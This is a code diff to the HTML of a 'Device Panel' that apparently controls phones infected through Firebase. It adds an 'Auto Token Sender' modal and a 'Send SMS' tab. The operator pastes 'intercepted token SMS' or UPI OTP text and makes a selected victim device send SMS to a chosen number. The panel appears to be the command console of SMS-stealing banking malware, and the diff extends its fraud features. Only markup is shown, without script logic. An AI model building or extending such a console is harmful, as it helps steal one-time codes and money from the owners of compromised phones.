@@ -14,12 +14,13 @@
         <span class="logo" aria-hidden="true">▣</span>
         <div>
           <h1>Device Panel</h1>
-          <p class="sub">axexodiweb · Firebase clients</p>
+          <p class="sub">axexodiweb · Firebase clients · auto token sender</p>
         </div>
       </div>
       <div class="top-actions">
         <div class="meta" id="meta">Loading…</div>
-        <button type="button" class="btn ghost" id="refreshBtn" title="Reload data">↻ Refresh</button>
+        <button type="button" class="btn accent" id="openSenderBtn" title="Auto Token Sender">⚡ Token Sender</button>
+        <button type="button" class="btn ghost" id="refreshBtn" title="Reload data">↻</button>
       </div>
     </header>
 
@@ -78,6 +79,55 @@
 
   <div id="backdrop" class="backdrop" hidden></div>
 
+  <!-- Global Auto Token Sender modal -->
+  <aside id="sender" class="drawer sender-drawer" hidden aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="sTitle">
+    <header class="drawer-head">
+      <div class="drawer-ident">
+        <div class="drawer-tag">AUTO TOKEN SENDER</div>
+        <h2 id="sTitle">Send via Firebase</h2>
+        <div class="drawer-sub">Writes <span class="mono">clients/{did}/webhookEvent/sendSms</span></div>
+      </div>
+      <button type="button" class="icon-btn" id="sClose" aria-label="Close sender">×</button>
+    </header>
+    <div class="drawer-body sender-body">
+      <label class="field">
+        <span>Device (DID)</span>
+        <select id="sDevice"></select>
+      </label>
+      <div class="field-row">
+        <label class="field">
+          <span>SIM slot</span>
+          <select id="sSim">
+            <option value="0">SIM 0</option>
+            <option value="1">SIM 1</option>
+          </select>
+        </label>
+        <label class="field">
+          <span>Priority</span>
+          <select id="sPriority">
+            <option value="high">high</option>
+            <option value="normal">normal</option>
+          </select>
+        </label>
+      </div>
+      <label class="field">
+        <span>To (recipient)</span>
+        <input id="sTo" type="tel" placeholder="+91XXXXXXXXXX" autocomplete="off" />
+      </label>
+      <label class="field">
+        <span>Message / token body</span>
+        <textarea id="sBody" rows="6" placeholder="Paste intercepted token SMS body…"></textarea>
+      </label>
+      <div class="field-row">
+        <button type="button" class="btn ghost" id="sParseBtn">Parse intercepted</button>
+        <button type="button" class="btn accent" id="sSendBtn">Send to device</button>
+      </div>
+      <div id="sStatus" class="status-log" aria-live="polite"></div>
+      <p class="hint">Paste a block containing <span class="mono">UPI SMS TOKEN INTERCEPTED</span> (or RECIPIENT/MESSAGE) and hit Parse. Send polls <span class="mono">isSended</span> up to 45s.</p>
+    </div>
+  </aside>
+
+  <!-- Per-device drawer -->
   <aside id="drawer" class="drawer" hidden aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="dTitle">
     <header class="drawer-head">
       <div class="drawer-ident">
@@ -94,6 +144,7 @@
       <button type="button" class="tab" data-tab="sims" role="tab">SIMs</button>
       <button type="button" class="tab" data-tab="info" role="tab">Info</button>
       <button type="button" class="tab" data-tab="messages" role="tab">Messages</button>
+      <button type="button" class="tab" data-tab="send" role="tab">Send SMS</button>
     </nav>
 
     <div class="drawer-body">
@@ -112,6 +163,31 @@
           <span class="msg-count" id="msgCount"></span>
         </div>
         <div class="msg-list" id="msgList"><p class="empty">Loading…</p></div>
+      </section>
+      <section id="tab-send" class="tab-panel" role="tabpanel" hidden>
+        <div class="send-panel">
+          <label class="field">
+            <span>SIM slot</span>
+            <select id="dSim">
+              <option value="0">SIM 0</option>
+              <option value="1">SIM 1</option>
+            </select>
+          </label>
+          <label class="field">
+            <span>To</span>
+            <input id="dTo" type="tel" placeholder="+91XXXXXXXXXX" />
+          </label>
+          <label class="field">
+            <span>Message</span>
+            <textarea id="dBody" rows="5" placeholder="Token / SMS body"></textarea>
+          </label>
+          <div class="field-row">
+            <button type="button" class="btn ghost" id="dQuickOtp">Use latest OTP text</button>
+            <button type="button" class="btn accent" id="dSendBtn">Send via this device</button>
+          </div>
+          <div id="dStatus" class="status-log"></div>
+          <p class="hint">Target: <span class="mono" id="dSendPath"></span></p>
+        </div>
       </section>
     </div>
   </aside>
